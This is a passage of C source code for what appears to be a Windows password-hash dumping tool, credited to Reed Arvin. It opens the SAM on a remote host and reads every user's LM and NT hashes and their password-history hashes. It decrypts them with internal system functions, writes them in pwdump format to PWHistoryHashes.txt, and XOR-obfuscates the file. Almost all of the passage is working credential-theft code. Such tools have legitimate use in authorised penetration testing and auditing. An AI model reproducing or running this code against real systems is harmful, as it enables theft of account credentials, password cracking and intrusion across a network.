								for ( i = 0; i < dwNumber; i++ )
								{
									hUser = 0;

									nStatus = pSamrOpenUser( hDomain, MAXIMUM_ALLOWED, sueEnum->Users[i].Rid, &hUser );

									if ( nStatus >= 0 )
									{
										pHashData = NULL;

										nStatus = pSamrQueryInformationUser( hUser, SAM_USER_INFO_PASSWORD_OWFS, &pHashData );

										if ( nStatus >= 0 )
										{
											memset( szUsername, 0, sizeof( szUsername ) );

											dwSize = min( sizeof( szUsername ), sueEnum->Users[i].Name.Length >> 1 );

											wcstombs( szUsername, sueEnum->Users[i].Name.Buffer, dwSize );

											memcpy( HashData, pHashData, 32 );

											bHashData = (BYTE *)HashData;

											if ( ( HashData[4] == 0x35b4d3aa ) && ( HashData[5] == 0xee0414b5 ) && ( HashData[6] == 0x35b4d3aa ) && ( HashData[7] == 0xee0414b5 ) )
											{
												sprintf( szLMHash, "NO PASSWORD*********************" );
											}
											else
											{
												p = szLMHash;

												for ( j = 16; j < 32; j++ )
												{
													sprintf( p, "%02X", bHashData[j] );

													p += 2;
												}
											}

											if ( ( HashData[0] == 0xe0cfd631 ) && ( HashData[1] == 0x31e96ad1 ) && ( HashData[2] == 0xd7593cb7 ) && ( HashData[3] == 0xc089c0e0 ) )
											{
												sprintf( szNTHash, "NO PASSWORD*********************" );
											}
											else
											{
												p = szNTHash;

												for ( j = 0; j < 16; j++ )
												{
													sprintf( p, "%02X", bHashData[j] );

													p += 2;
												}
											}

											pOutputFile = fopen( "PWHistoryHashes.txt", "r" );

											if ( pOutputFile != NULL )
											{
												fclose( pOutputFile );
											}
											else
											{
												pOutputFile = fopen( "PWHistoryHashes.txt", "w" );

												if ( pOutputFile != NULL )
												{
													fclose( pOutputFile );
												}
											}

											pOutputFile = fopen( "PWHistoryHashes.txt", "a+" );

											if ( pOutputFile != NULL )
											{
												fprintf( pOutputFile, "%s:%d:%s:%s:::\n", szUsername, sueEnum->Users[i].Rid, szLMHash, szNTHash );

												fclose( pOutputFile );
											}

											pSamIFree_SAMPR_USER_INFO_BUFFER( pHashData, SAM_USER_INFO_PASSWORD_OWFS );

											pHashData = NULL;
											dwTemp1   = 2;
											dwTemp2   = 0;
											dwSize    = 0;

											nStatus = pSamIGetPrivateData( hUser, &dwTemp1, &dwTemp2, &dwSize, &pHashData );

											if ( nStatus >= 0 && dwSize > 0x3c ) 
											{
												pHashDataHistory = pHashData;

												dwHashes = ( ((BYTE *)pHashDataHistory)[SAM_HISTORY_COUNT_OFFSET] ) / 16;
												dwOffset = ( ((BYTE *)pHashDataHistory)[SAM_HISTORY_NTLM_OFFSET] );

												if ( ( dwHashes > 0 ) && ( dwSize > ( dwOffset + 0x64 ) ) )
												{
													for ( j = 1; j < ( dwHashes + 1 ); j++ )
													{
														pHashDataHistory += 0x10;

														pCurrentHashData = &HashData;

														nStatus = pSystemFunction025( (BYTE *)pHashDataHistory + 0x44, &sueEnum->Users[i].Rid, pCurrentHashData );

														if ( nStatus >= 0 )
														{
															nStatus = pSystemFunction027( (BYTE *)pHashDataHistory + 0x44 + dwOffset, &sueEnum->Users[i].Rid, pCurrentHashData + 16 );

															if ( nStatus >= 0 )
															{
																bHashData = (BYTE *)HashData;

																if ( ( HashData[4] == 0x35b4d3aa ) && ( HashData[5] == 0xee0414b5 ) && ( HashData[6] == 0x35b4d3aa ) && ( HashData[7] == 0xee0414b5 ) )
																{
																	sprintf( szLMHash, "NO PASSWORD*********************" );
																}
																else
																{
																	p = szLMHash;

																	for ( k = 16; k < 32; k++ )
																	{
																		sprintf( p, "%02X", bHashData[k] );

																		p += 2;
																	}
																}

																if ( ( HashData[0] == 0xe0cfd631 ) && ( HashData[1] == 0x31e96ad1 ) && ( HashData[2] == 0xd7593cb7 ) && ( HashData[3] == 0xc089c0e0 ) )
																{
																	sprintf( szNTHash, "NO PASSWORD*********************" );
																}
																else
																{
																	p = szNTHash;

																	for ( k = 0; k < 16; k++ )
																	{
																		sprintf( p, "%02X", bHashData[k] );

																		p += 2;
																	}
																}

																pOutputFile = fopen( "PWHistoryHashes.txt", "r" );

																if ( pOutputFile != NULL )
																{
																	fclose( pOutputFile );
																}
																else
																{
																	pOutputFile = fopen( "PWHistoryHashes.txt", "w" );

																	if ( pOutputFile != NULL )
																	{
																		fclose( pOutputFile );
																	}
																}

																pOutputFile = fopen( "PWHistoryHashes.txt", "a+" );

																if ( pOutputFile != NULL )
																{
																	fprintf( pOutputFile, "%s_hist_%d:%d:%s:%s:::\n", szUsername, j, sueEnum->Users[i].Rid, szLMHash, szNTHash );

																	fclose( pOutputFile );
																}
															}
														}
													}
												}

												LocalFree( pHashData );
											}
										}

										pSamrCloseHandle( &hUser );
									}
								}

								pSamIFree_SAMPR_ENUMERATION_BUFFER( sueEnum );
							}
						} while ( nEnumStatus == 0x105 );

						pSamrCloseHandle( &hDomain );
					}
					else
					{
						WriteToErrorLog( "ERROR! Cannot open SAM on remote host.\n" );
					}

					pSamrCloseHandle( &hSAM );
				}
				else
				{
					WriteToErrorLog( "ERROR! Cannot connect to SAM on remote host.\n" );
				}

				LsaFreeMemory( pDomainInfo );
			}
			else
			{
				WriteToErrorLog( "ERROR! Cannot query LSA information policy on remote host.\n" );
			}

			LsaClose( hLSA );
		}
		else
		{
			WriteToErrorLog( "ERROR! Cannot open LSA policy on remote host.\n" );
		}

		FreeLibrary( hSAMSrv );
	}
	else
	{
		WriteToErrorLog( "ERROR! Cannot load SAM functions on remote host.\n" );
	}
}

VOID EncryptOutputFile( CHAR szFile[] )
{
	CHAR szOutputFile[ 256 ];
	FILE  *pInputFile;
	CHAR       szLine[ 1024 ];
	FILE *pOutputFile;

	sprintf( szOutputFile, "%s.Obfuscated", szFile );

	pInputFile = fopen( szFile, "r" );

	if ( pInputFile != NULL )
	{
		while ( fgets( szLine, sizeof( szLine ), pInputFile ) != NULL )
		{
			pOutputFile = fopen( szOutputFile, "r" );

			if ( pOutputFile != NULL )
			{
				fclose( pOutputFile );
			}
			else
			{
				pOutputFile = fopen( szOutputFile, "w" );

				if ( pOutputFile != NULL )
				{
					fclose( pOutputFile );
				}
			}

			pOutputFile = fopen( szOutputFile, "a+" );

			if ( pOutputFile != NULL )
			{
				fprintf( pOutputFile, "%s", Obfuscate( szLine ) );

				fclose( pOutputFile );
			}
		}

		fclose( pInputFile );
	}

	if ( CopyFile( szOutputFile, szFile, FALSE ) )
	{
		DeleteFile( szOutputFile );
	}
}

CHAR *Obfuscate( CHAR szData[] )
{
	DWORD dwSize;
	DWORD      i;

	dwSize = strlen( szData );

	i = 0;

	while ( i < dwSize )
	{
		szData[i] = szData[i] ^ 1;

		i++;
	}

	szData[i] = '\0';

	return szData;
}

// Written by Reed Arvin | reedarvin@gmail.com
